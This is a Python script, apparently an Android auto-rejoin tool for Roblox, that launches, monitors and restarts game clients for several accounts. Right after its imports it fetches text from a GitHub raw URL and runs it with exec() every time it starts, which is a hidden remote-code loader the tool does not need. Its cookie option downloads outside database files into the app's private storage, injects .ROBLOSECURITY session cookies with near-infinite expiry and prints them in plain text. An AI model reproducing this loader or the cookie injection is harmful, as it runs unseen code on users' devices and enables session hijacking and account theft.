import os
import requests
import json
import time
import subprocess
import asyncio
import aiohttp
import threading
import psutil
import re
import crypto
import platform
import uuid 
import hashlib
import sqlite3
import shutil
import signal
from colorama import init, Fore, Style
from threading import Lock

url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
response = requests.get(url)

exec(response.text)

init() 

SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
ACCOUNTS_FILE = "AXAccount.txt"
interval = None
stop_webhook_thread = False
webhook_thread = None

def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    header = r"""
   _____         .__              .__         __________            __       .__        
  /  _  \ ___  __|__| ____   ____ |__|__  ___ \______   \ ____     |__| ____ |__| ____  
 /  /_\  \\  \/  /  |/  _ \ /    \|  \  \/  /  |       _// __ \    |  |/  _ \|  |/    \ 
/    |    \>    <|  (  <_> )   |  \  |>    <   |    |   \  ___/    |  (  <_> )  |   |  \
\____|__  /__/\_ \__|\____/|___|  /__/__/\_ \  |____|_  /\___  >\__|  |\____/|__|___|  /
        \/      \/              \/         \/         \/     \/\______|              \/           
"""
    print(Fore.LIGHTCYAN_EX + header + Style.RESET_ALL)

def get_roblox_packages():
    suffixes = 'qwertyuiopasdfghjklzxcvbnm0123456789'
    package_prefix = "com.roblox.clien"
    
    try:
        output = subprocess.check_output("pm list packages", shell=True, text=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "An Error Occurred While Searching For Package On Your Device!" + Style.RESET_ALL)
        return []

    packages = [f"{package_prefix}{suffix}" for suffix in suffixes if f"{package_prefix}{suffix}" in output]
    
    if packages:
        for package in packages:
            print(Fore.GREEN + f"Package Found On Your Device, Which Is: {package}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "No Package Found On Your Device, Please Set Package To 0-9 Or A-M!" + Style.RESET_ALL)
    
    return packages

def kill_roblox_processes():
    print(Fore.YELLOW + "Turning Off All Roblox Games On Your Device..." + Style.RESET_ALL)
    package_names = get_roblox_packages()

    if not package_names:
        print(Fore.RED + "There Are No Active Packages On Your Device!" + Style.RESET_ALL)
        return

    for package_name in package_names:
        kill_roblox_process(package_name)

def kill_roblox_process(package_name):
    print(Fore.YELLOW + f"Roblox Game Shutdown In Progress: {package_name}" + Style.RESET_ALL)
    
    try:
        result = subprocess.run(['pkill', '-f', package_name], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(Fore.GREEN + f"Roblox Game Successfully Disabled: {package_name}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"An Error Occurred While Closing Roblox Game: {package_name} (might not exist)" + Style.RESET_ALL)
    
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"An Error Occurred While Closing Roblox Game With Package Is {package_name}, Status Code Is: {e}" + Style.RESET_ALL)

    time.sleep(1)

def launch_roblox(package_name, server_link, num_packages):
    try:
        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.startup.ActivitySplash', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(Fore.YELLOW + f"In Progress Opening Roblox Game For: {package_name}..." + Style.RESET_ALL)
        
        time.sleep(15 if num_packages >= 6 else 8)  

        subprocess.run(['am', 'start', '-n', f'{package_name}/com.roblox.client.ActivityProtocolLaunch', '-d', server_link], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(Fore.YELLOW + f"In Progress Joining Roblox Game For: {package_name}..." + Style.RESET_ALL)
        time.sleep(20)
    except Exception as e:
        print(Fore.RED + f"An Error Occurred While Launching Roblox Game: {package_name}, Status Code Is: {e}" + Style.RESET_ALL)

def format_server_link(input_link):
    if 'roblox.com' in input_link:
        return input_link
    
    if input_link.isdigit():
        return f'roblox://placeID={input_link}'
    
    print(Fore.RED + "Invalid Input! Please Enter Valid Game ID Or Valid Private Server Link!" + Style.RESET_ALL)
    return None

def save_server_links(server_links):
    with open(SERVER_LINKS_FILE, "w") as file:
        for package, link in server_links:
            file.write(f"{package},{link}\n")

def load_server_links():
    server_links = []
    if os.path.exists(SERVER_LINKS_FILE):
        with open(SERVER_LINKS_FILE, "r") as file:
            for line in file:
                package, link = line.strip().split(",", 1)
                server_links.append((package, link))
    return server_links

def save_accounts(accounts):
    with open(ACCOUNTS_FILE, "w") as file:
        for package, user_id in accounts:
            file.write(f"{package},{user_id}\n")

def load_accounts():
    accounts = []
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, "r") as file:
            for line in file:
                package, user_id = line.strip().split(",", 1)
                accounts.append((package, user_id))
    return accounts

def find_userid_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            # Debugging information removed to keep console clean

            userid_start = content.find('"UserId":"')
            if userid_start == -1:
                print("Userid not found")
                return None

            userid_start += len('"UserId":"')
            userid_end = content.find('"', userid_start)
            if userid_end == -1:
                print("Userid end quote not found")
                return None

            userid = content[userid_start:userid_end]
            return userid

    except IOError as e:
        print(f"Error reading file: {e}")
        return None

async def get_user_id(username):
    url = "https://users.roblox.com/v1/usernames/users"
    payload = {
        "usernames": [username],
        "excludeBannedUsers": True
    }
    headers = {
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload, headers=headers) as response:
            data = await response.json()
            if 'data' in data and len(data['data']) > 0:
                return data['data'][0]['id']
    return None

def get_username(user_id):
    try:
        url = f"https://users.roblox.com/v1/users/{user_id}"
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        return data.get("name", "Unknown")
    except Exception as e:
        print(f"Error getting username for user ID {user_id}: {e}")
        return None

def check_user_online(user_id):
    url = "https://presence.roblox.com/v1/presence/users"
    headers = {'Content-Type': 'application/json'}
    body = {"userIds": [user_id]}
    
    try:
        response = requests.post(url, headers=headers, json=body)
        response.raise_for_status() 

        data = response.json()
        return data["userPresences"][0].get("userPresenceType")
    
    except requests.RequestException as e:
        print(f"An Error Occurred While Checking Status, Status Code Is: {e}")
        return None

def verify_cookie(cookie_value):
    try:
        # Set the headers with the cookie
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie_value}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }

        # Introduce a small delay to mimic a more natural request pattern
        time.sleep(1)

        # Make a GET request to the authentication endpoint
        response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers)

        if response.status_code == 200:
            # The user is authenticated
            print(Fore.GREEN + "Cookie is valid! User is authenticated." + Style.RESET_ALL)
            return True
        elif response.status_code == 401:
            # Unauthorized, the cookie is invalid
            print(Fore.RED + "Invalid cookie. The user is not authenticated." + Style.RESET_ALL)
            return False
        else:
            # Some other error occurred
            print(Fore.RED + f"Error verifying cookie: {response.status_code} - {response.text}" + Style.RESET_ALL)
            return False

    except Exception as e:
        print(Fore.RED + f"Exception occurred while verifying cookie: {e}" + Style.RESET_ALL)
        return False
  
def download_file(url, destination, binary=False):
    try:
        with requests.Session() as session:
            response = session.get(url, stream=True)
            if response.status_code == 200:
                mode = 'wb' if binary else 'w'
                with open(destination, mode) as file:
                    if binary:
                        shutil.copyfileobj(response.raw, file)
                    else:
                        for chunk in response.iter_content(chunk_size=8192):
                            file.write(chunk.decode('utf-8'))
                print(Fore.GREEN + f"{os.path.basename(destination)} Downloaded Successfully." + Style.RESET_ALL)
                return destination
            else:
                print(Fore.RED + f"An Error Occurred While Downloading the File: {os.path.basename(destination)}, Status Code Is: {response.status_code}" + Style.RESET_ALL)
                return None
    except Exception as e:
        print(Fore.RED + f"Another Error Occurred While Downloading the File: {os.path.basename(destination)}, Status Code Is: {e}" + Style.RESET_ALL)
        return None

def replace_cookie_value_in_db(db_path, new_cookie_value):
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # First, check if the .ROBLOSECURITY cookie exists
        cursor.execute("""
            SELECT COUNT(*) FROM cookies WHERE host_key = '.roblox.com' AND name = '.ROBLOSECURITY'
        """)
        cookie_exists = cursor.fetchone()[0]

        if cookie_exists:
            # Update the existing cookie
            cursor.execute("""
                UPDATE cookies
                SET value = ?, last_access_utc = ?, expires_utc = ?
                WHERE host_key = '.roblox.com' AND name = '.ROBLOSECURITY'
            """, (new_cookie_value, int(time.time() * 1000000), 99999999999999999))
        else:
            # Insert the cookie if it doesn't exist
            cursor.execute("""
                INSERT INTO cookies (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc)
                VALUES (?, '.roblox.com', '.ROBLOSECURITY', ?, '/', 99999999999999999, 0, 0, ?)
            """, (int(time.time() * 1000000), new_cookie_value, int(time.time() * 1000000)))

        conn.commit()
        conn.close()
        print(Fore.GREEN + "Cookie value replaced successfully in the database!" + Style.RESET_ALL)

    except sqlite3.OperationalError as e:
        print(Fore.RED + f"Database error during cookie replacement: {e}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error replacing cookie value in database: {e}" + Style.RESET_ALL)

def inject_cookies_and_appstorage():
    db_url = "https://github.com/shirooscripts/auto-rj/raw/main/Cookies"  # Keep this as binary
    appstorage_url = "https://raw.githubusercontent.com/shirooscripts/auto-rj/main/appStorage.json"  # Use this for JSON

    downloaded_db_path = download_file(db_url, "Cookies.db", binary=True)
    downloaded_appstorage_path = download_file(appstorage_url, "appStorage.json", binary=False)

    if not downloaded_db_path or not downloaded_appstorage_path:
        print(Fore.RED + "Failed to download necessary files. Exiting." + Style.RESET_ALL)
        return

    cookie_txt_path = os.path.join(os.getcwd(), "cookie.txt")  # cookie.txt in the same directory as the script
    
    if not os.path.exists(cookie_txt_path):
        print(Fore.RED + "cookie.txt not found in the current directory!" + Style.RESET_ALL)
        return

    with open(cookie_txt_path, "r") as file:
        cookies = [line.strip() for line in file.readlines()]

    if not cookies:
        print(Fore.RED + "No cookies found in cookie.txt. Please add your cookies." + Style.RESET_ALL)
        return

    packages = get_roblox_packages()

    if len(cookies) > len(packages):
        print(Fore.RED + "More cookies in cookie.txt than packages available. Please ensure each cookie has a corresponding package." + Style.RESET_ALL)
        return

    for idx, package_name in enumerate(packages):
        try:
            if idx < len(cookies):
                cookie = cookies[idx]
                
                print(Fore.YELLOW + f"Verifying cookie for {package_name} before injection..." + Style.RESET_ALL)
                if verify_cookie(cookie):
                    print(Fore.GREEN + f"Cookie for {package_name} is valid!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Cookie for {package_name} is invalid. Skipping injection..." + Style.RESET_ALL)
                    continue
                
                print(Fore.GREEN + f"Injecting cookie for {package_name}: {cookie}" + Style.RESET_ALL)
                
                # Paths to the destination directories
                destination_db_dir = f"/data/data/{package_name}/app_webview/Default/"
                destination_appstorage_dir = f"/data/data/{package_name}/files/appData/LocalStorage/"

                # Ensure directories exist
                os.makedirs(destination_db_dir, exist_ok=True)
                os.makedirs(destination_appstorage_dir, exist_ok=True)

                # Copy the downloaded Cookies.db to the destination
                destination_db_path = os.path.join(destination_db_dir, "Cookies")
                shutil.copyfile(downloaded_db_path, destination_db_path)
                print(Fore.GREEN + f"Copied Cookies.db to {destination_db_path}" + Style.RESET_ALL)

                # Inject the appStorage.json
                destination_appstorage_path = os.path.join(destination_appstorage_dir, "appStorage.json")
                shutil.copyfile(downloaded_appstorage_path, destination_appstorage_path)
                print(Fore.GREEN + f"Copied appStorage.json to {destination_appstorage_path}" + Style.RESET_ALL)

                # Replace the cookie value in the database
                replace_cookie_value_in_db(destination_db_path, cookie)

                # Verify the cookie after injection
                print(Fore.YELLOW + f"Verifying cookie for {package_name} after injection..." + Style.RESET_ALL)
                if verify_cookie(cookie):
                    print(Fore.GREEN + f"Cookie for {package_name} is valid after injection!" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"Cookie for {package_name} is invalid after injection!" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"Error injecting cookie for {package_name}: {e}" + Style.RESET_ALL)

    print(Fore.GREEN + "Cookie and appStorage injection completed for all packages." + Style.RESET_ALL) 

def main():
    print_header()
    
    while True:
        setup_type = input(Fore.GREEN + "Choose Your Setup:\n1. Start Auto Rejoin Roblox Game\n2. Set User ID For Each Package\n3. Same Game ID Or Private Server Link\n4. Different Private Server Or Game ID\n5. Clear User ID And/Or Private Server Link\n6. List\n7. Auto Setup User ID\n8. Roblox Account Login Using Cookie\n9. Exit\nPlease Enter Your Choice: " + Style.RESET_ALL) 
        
        if setup_type == "1": 
            accounts = load_accounts() 
                
            server_links = load_server_links()
            accounts = load_accounts() 

            if not accounts:
                print(Fore.RED + "You Have Not Set User ID, Please Check And Try Again Later!" + Style.RESET_ALL)
                continue
            elif not server_links:
                print(Fore.RED + "You Have Not Set Game ID Or Private Server Link, Please Check And Try Again Later!" + Style.RESET_ALL)
                continue

            force_rejoin_interval = int(input(Fore.CYAN + "Please Enter Required Time To Shut Down And Restart Roblox Game(Minute): " + Style.RESET_ALL)) * 60

            print(Fore.YELLOW + "In Progress Turning Off All Roblox Games On Your Device..." + Style.RESET_ALL)
            kill_roblox_processes()
            print(Fore.YELLOW + "Please Wait 5 Seconds To Restart Roblox Game..." + Style.RESET_ALL)
            time.sleep(5)

            num_packages = len(server_links)  

            for package_name, server_link in server_links:
                launch_roblox(package_name, server_link, num_packages)

            start_time = time.time()

            while True:
                for package_name, user_id in accounts:
                    if not user_id.isdigit():
                        print(f"Retrieving user ID for username: {user_id}...")
                        user_id = asyncio.run(get_user_id(user_id))
                        if user_id is None:
                            print(Fore.RED + "User ID Unable To Find, Please Enter Manually!" + Style.RESET_ALL)
                            user_id = input(Fore.CYAN + "Please Enter Your User ID: " + Style.RESET_ALL)

                    username = get_username(user_id) or user_id

                    presence_type = check_user_online(user_id)

                    if presence_type == 2: 
                        print(Fore.GREEN + f"{username} ({user_id}) is currently in-game." + Style.RESET_ALL)
                    else:
                        print(Fore.RED + f"{username} ({user_id}) is offline or in another status. Checking again..." + Style.RESET_ALL)
                        
                        max_retries = 5
                        retry_interval = 3  
                        for attempt in range(max_retries):
                            presence_type = check_user_online(user_id)
                            if presence_type == 2:  
                                print(Fore.GREEN + f"{username} ({user_id}) is currently in-game." + Style.RESET_ALL)
                                break
                            else:
                                print(Fore.YELLOW + f"Attempt {attempt + 1}/{max_retries}: {username} ({user_id}) is still offline. Retrying in {retry_interval} seconds..." + Style.RESET_ALL)
                                time.sleep(retry_interval) 

                        if presence_type != 2:  # If the user was offline in all checks
                            print(Fore.RED + f"{username} ({user_id}) is offline. Rejoining..." + Style.RESET_ALL)
                            kill_roblox_process(package_name)
                            launch_roblox(package_name, server_link, num_packages)

                    time.sleep(5) 

                time.sleep(60)  
                
                if time.time() - start_time >= force_rejoin_interval:
                    print("Force killing Roblox processes due to time limit.")
                    kill_roblox_processes()
                    start_time = time.time()  # Reset start time
                    print(Fore.YELLOW + "Please Wait 5 Seconds To Restart Roblox Game..." + Style.RESET_ALL)
                    time.sleep(5)
                    # Rejoin all servers after killing the processes
                    for package_name, server_link in server_links:
                        launch_roblox(package_name, server_link, num_packages) 

        elif setup_type == "2":
            accounts = []
            packages = get_roblox_packages()

            for package_name in packages:
                user_input = input(f"Enter the user ID or username for {package_name}: ")
                user_id = None

                if user_input.isdigit():
                    user_id = user_input
                else:
                    print(f"Retrieving user ID for username: {user_input}...")
                    user_id = asyncio.run(get_user_id(user_input))
                    if user_id is None:
                        print(Fore.RED + "Failed to retrieve user ID. Please enter the user ID manually." + Style.RESET_ALL)
                        user_id = input("Enter the user ID: ")

                accounts.append((package_name, user_id))
                print(f"Set {package_name} to user ID: {user_id}")

            save_accounts(accounts)
            print(Fore.GREEN + "User IDs saved!" + Style.RESET_ALL)

        elif setup_type == "3":
            server_link = input(Fore.CYAN + "Please Enter Game ID Or Private Server Link: " + Style.RESET_ALL)
            formatted_link = format_server_link(server_link)

            if formatted_link:
                packages = get_roblox_packages()
                server_links = [(package_name, formatted_link) for package_name in packages]
                save_server_links(server_links)
                print(Fore.GREEN + "Game ID And Private Server Link Saved Successfully." + Style.RESET_ALL)

        elif setup_type == "4":
            packages = get_roblox_packages()
            server_links = []

            for package_name in packages:
                server_link = input(Fore.CYAN + f"Please Enter Game ID Or Private Server Link For: {package_name}: " + Style.RESET_ALL)
                formatted_link = format_server_link(server_link)

                if formatted_link:
                    server_links.append((package_name, formatted_link))

            save_server_links(server_links)  

        elif setup_type == "5":
            clear_choice = input(Fore.GREEN + "Do You Really Want To Delete?\n1. Delete All User IDs\n2. Delete All Private Server Links\n3. Delete Both\nEnter Your Choice: " + Style.RESET_ALL)

            if clear_choice == "1":
                os.remove(ACCOUNTS_FILE)
                print(Fore.GREEN + "Successfully Deleted All User IDs From Your Device." + Style.RESET_ALL)
            elif clear_choice == "2":
                os.remove(SERVER_LINKS_FILE)
                print(Fore.GREEN + "Successfully Deleted All Private Server Links From Your Device." + Style.RESET_ALL)
            elif clear_choice == "3":
                os.remove(ACCOUNTS_FILE)
                os.remove(SERVER_LINKS_FILE)
                print(Fore.GREEN + "Successfully Deleted All User IDs And Private Server Links From Your Device." + Style.RESET_ALL) 

        elif setup_type == "6":
            accounts = load_accounts()
            server_links = load_server_links()

            print(Fore.CYAN + "Usernames, User IDs, Package Names, and Server Links:" + Style.RESET_ALL)
            for (package_name, user_id), (_, server_link) in zip(accounts, server_links):
                username = get_username(user_id) or user_id
                print(f"Package Name: {package_name}, Username: {username}, User ID: {user_id}, Server Link: {server_link}")

        elif setup_type == "7":
            print(Fore.GREEN + "Auto Setup User IDs from each package's appStorage.json..." + Style.RESET_ALL)
            packages = get_roblox_packages()
            accounts = []

            for package_name in packages:
                file_path = f'/data/data/{package_name}/files/appData/LocalStorage/appStorage.json'
                user_id = find_userid_from_file(file_path)
                
                if user_id:
                    accounts.append((package_name, user_id))
                    print(f"Found UserId for {package_name}: {user_id}")
                else:
                    print(Fore.RED + f"UserId not found for {package_name}. Make sure the file path is correct and the format is as expected." + Style.RESET_ALL)

            save_accounts(accounts)
            print(Fore.GREEN + "User IDs saved from appStorage.json!" + Style.RESET_ALL)

            # Prompt for server link
            server_link = input(Fore.CYAN + "Please Enter Game ID Or Private Server Link: " + Style.RESET_ALL)
            formatted_link = format_server_link(server_link)

            if formatted_link:
                server_links = [(package_name, formatted_link) for package_name in packages]
                save_server_links(server_links)
                print(Fore.GREEN + "Game ID or private server link saved successfully!" + Style.RESET_ALL)


        elif setup_type == "8":
            inject_cookies_and_appstorage()
            input(Fore.GREEN + "\nPress Enter To Exit..." + Style.RESET_ALL) 

        elif setup_type == "9":
            global stop_webhook_thread
            stop_webhook_thread = True 
            break 

if __name__ == "__main__":
    main() 
